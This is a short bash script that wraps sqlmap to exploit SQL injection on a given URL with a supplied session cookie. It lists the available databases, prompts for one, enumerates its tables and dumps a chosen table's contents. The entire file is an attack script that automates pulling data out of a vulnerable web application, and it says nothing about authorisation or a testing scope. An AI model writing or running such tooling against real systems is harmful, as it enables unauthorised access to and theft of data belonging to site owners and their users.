#!/bin/bash

URL="$1"
COOKIE="$2"

if [[ -z "$URL" || -z "$COOKIE" ]]; then
    echo "Usage: $0 <url> <cookie>"
    exit 1
fi

# Temporary file to store sqlmap output
TMP_OUTPUT=$(mktemp)

echo "Running sqlmap to get databases..."
sqlmap -u "$URL" --cookie="$COOKIE" --batch --dbs | tee "$TMP_OUTPUT"

# Extract database names using grep
echo
echo "Available Databases:"
DB_LIST=$(grep -oP '\[\*\] \K[^\r\n]*' "$TMP_OUTPUT" | grep -v "information_schema\|performance_schema\|mysql\|sys" | nl)

if [[ -z "$DB_LIST" ]]; then
    echo "No databases found."
    rm "$TMP_OUTPUT"
    exit 1
fi

echo "$DB_LIST"

# Select a DB by number
echo
read -p "Enter the number of the database to use: " DB_NUMBER

# Get the selected DB name
SELECTED_DB=$(echo "$DB_LIST" | sed -n "${DB_NUMBER}p" | awk '{print $2}')

if [[ -z "$SELECTED_DB" ]]; then
    echo "Invalid selection."
    rm "$TMP_OUTPUT"
    exit 1
fi

echo "You selected database: $SELECTED_DB"

# Get tables of selected DB
echo "Running sqlmap to get tables in DB '$SELECTED_DB'..."
sqlmap -u "$URL" --cookie="$COOKIE" -D "$SELECTED_DB" --tables

# Select table to dump
echo
read -p "Enter the table name you want to dump (exact name): " TABLE_NAME

if [[ -z "$TABLE_NAME" ]]; then
    echo "Table name cannot be empty."
    rm "$TMP_OUTPUT"
    exit 1
fi

# Dump selected table
echo "Running sqlmap to dump table '$TABLE_NAME' from DB '$SELECTED_DB'..."
sqlmap -u "$URL" --cookie="$COOKIE" -D "$SELECTED_DB" -T "$TABLE_NAME" --dump

# Clean up
rm "$TMP_OUTPUT"
